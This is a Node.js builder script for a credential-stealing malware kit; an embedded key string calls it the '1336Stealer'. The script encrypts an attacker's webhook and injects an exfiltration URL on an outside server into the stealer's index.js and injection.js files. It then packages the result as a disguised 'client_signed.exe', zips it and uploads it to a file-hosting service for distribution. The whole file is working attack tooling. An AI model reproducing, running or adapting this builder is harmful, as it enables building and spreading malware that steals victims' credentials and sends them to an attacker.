const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const FormData = require("form-data");
const axios = require("axios");
const archiver = require('archiver');
const exe = require('@angablue/exe');

async function upload(path) {
    const server = await getServer();
    const link = await uploadFile(path, server);
    return link;
}


async function getServer() {
    const res = await axios({
        url: `https://apiv2.gofile.io/getServer`,
        method: "GET",
        headers: {
            accept: "*/*",
            "accept-language": "en-US,en;",
            "cache-control": "no-cache",
            pragma: "no-cache",
            referrer: "https://gofile.io/uploadFiles",
            mode: "cors",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
            dnt: 1,
            origin: "https://gofile.io"
        },
    });

    if (res.data.status !== "ok") {
        throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.server;
}

async function uploadFile(path, server) {
    const formData = new FormData();
    formData.append('file', fs.createReadStream(path));

    const res = await axios({
        url: `https://${server}.gofile.io/uploadFile`,
        method: "POST",
        headers: {
            ...formData.getHeaders(),
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        referrer: "https://gofile.io/uploadFiles",
        data: formData,
    });

    if (res.data.status !== "ok") {
        throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
    }

    return res.data.data.downloadPage;
}

const args = process.argv.slice(2);

if (args.length != 3) {
    console.log("ERROR: Invalid exe name detected *(retry without space)*");
    return;
}

// Key of the server
const key = "1336StealerWillNeverDied";
const crypto = require('crypto');

function encrypt(plainText) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let cipherText;
    try {
        cipherText = cipher.update(plainText, 'utf8', 'hex');
        cipherText += cipher.final('hex');
        cipherText = iv.toString('hex') + cipherText;
    } catch (e) {
        cipherText = null;
    }
    return cipherText;
}

//Webhook Protect
async function start() {
    const encryptedWebhook = "http://api.nftroulette.store:2086/webhooks/" + encrypt(args[1]);
    console.log(encryptedWebhook);

    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace("%WEBHOOK%", encryptedWebhook));
    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace("%WEBHOOK%", encryptedWebhook));

    await exec(`pkg -C GZip -o client_signed.exe -t node18-win-x64 .`);

    fs.writeFileSync("index.js", fs.readFileSync("index.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
    fs.writeFileSync("./utils/injection.js", fs.readFileSync("./utils/injection.js").toString().replace(encryptedWebhook, "%WEBHOOK%"));
    fs.renameSync("client_signed.exe", args[2] + ".exe");

    const output = fs.createWriteStream(__dirname + '/' + args[2] + '.zip');
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });

    archive.pipe(output);

    const file = process.cwd() + "/" + args[2] + ".exe";
    archive.append(fs.createReadStream(file), { name: args[2] + ".exe" });

    await archive.finalize();

    const link = await upload(process.cwd() + "/" + args[2] + ".zip");

    fs.appendFileSync("link.txt", link);
    fs.rmSync(process.cwd() + "/" + args[2] + ".exe");
    fs.rmSync(process.cwd() + "/" + args[2] + ".zip");
}

start();
